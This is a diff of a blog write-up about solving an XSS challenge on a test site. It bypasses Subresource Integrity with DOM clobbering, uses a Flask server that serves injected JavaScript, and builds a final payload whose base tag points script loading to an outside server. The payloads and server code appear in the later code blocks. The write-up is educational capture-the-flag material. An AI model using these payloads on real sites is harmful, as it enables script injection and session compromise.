@@ -27,10 +27,13 @@ var isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator
 document.getElementById("txt").onkeyup = function(){
 	this.value = this.value.replace(/[&*<>%]/g, '');
 };
+
+
 document.getElementById('btn').onclick = function(){
 	val = document.getElementById('txt').value;
 	document.getElementById('theIframe').src = '/frame.html?param='+val;
 };
+
 ```
 
 
@@ -75,9 +78,12 @@ and We were able to load frame-analytics.js from another domain. Now I setup my 
 ```python
 from flask import Flask, request, send_from_directory, Response
 from flask_cors import CORS, cross_origin
+
+
 app = Flask(__name__, static_url_path='')
 cors = CORS(app)
 app.config['CORS_HEADERS'] = 'Content-Type'
+
 @app.route("/files/<path:path>")
 @cross_origin()
 def exploit(path):
@@ -85,6 +91,7 @@ def exploit(path):
     alert(document.domain);
         """;
     return Response(jscode, mimetype='application/javascript')
+
 if __name__ == '__main__':
     app.run(debug=True)
 ```
@@ -97,7 +104,11 @@ Now the response in console was different and It was giving error because of Sub
 
 
 ***Subresource Integrity (SRI)** is a security feature that enables browsers to verify that resources they fetch (for example, from a CDN) are delivered without unexpected manipulation. It works by allowing you to provide a cryptographic hash that a fetched resource must match.*
+
+
 Its means we had to change the integrity attribute’s value also to load our script so I started looking for source code and found this.
+
+
 ```javascript
 window.fileIntegrity = window.fileIntegrity || {
 	'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
@@ -105,6 +116,8 @@ window.fileIntegrity = window.fileIntegrity || {
 	'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
 	'creationtime' : 1602687229
 }
+
+
 // securely add the analytics code into iframe
 script = document.createElement('script');
 script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
@@ -112,28 +125,66 @@ script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
 script.setAttribute('crossorigin', 'anonymous');
 analyticsFrame.contentDocument.body.appendChild(script);
 ```
+
+
 If you don’t understand this then let me explain. This code is checking If value of window.fileIntegrity is assigned then use that value to generate script tag with integrity’s value window.fileIntegrity.value and fileIntegrity was a global variable.
+
+
 so after this we had to use Dom Clobbering technique to control the global variable fileIntegrity
+
+
 ***DOM clobbering** is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.*
+
+
 It was easy to bypass this SRI using Dom Clobbering so I used anchor tag with id and name to control integrity’s value.
+
+
 ```
 paylaod : <a id=fileIntegrity><a id=fileIntegrity name=value href=theamanrawat>
 ```
+
+
 this payload will defined the value of window.fileintegrity and we were able to load our JavaScript code.
+
+
 ![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-27-1024x614.png)
+
+
 Now alert was blocked because of sandbox in iframe so we had to bypass this and bypassing this sandbox was very simple because we can execute JavaScript function such as createElement(), console.log() and etc..
+
+
 To bypass this I created script tag outside the sandbox iframe and my final payload was this
+
+
 ```
 </title></head><body><iframe src='https://wacky.buggywebsite.com/frame.html?param=aman</title><a id=fileIntegrity><a id=fileIntegrity name=value href=theamanrawat><base href=//myserver.com>' id='theIframe' name=iframe></iframe></body></html><!--
 ```
+
+
 I sent this payload and the alert was executed :)
+
+
 ![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-17-edited.png)
+
+
 # Now its time to create working PoC on bugpoc.
+
+
 I used **mock endpoint builder** for JavaScript code
+
+
 ![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-29-edited.png)
+
+
 and then **Flexible Redirector** for redirecting all path to mock endpoint.
+
+
 Now I created front end poc to run the exploit.
+
+
 ![image](https://gyanihackers.com/blog/wp-content/uploads/2020/11/Screenshot-31-1024x614.png)
+
+
 That’s it for this writeup. You can check the my PoC on https://bugpoc.com/poc#bp-uvrG5pXO & password : `SHYwasp53`
 
 
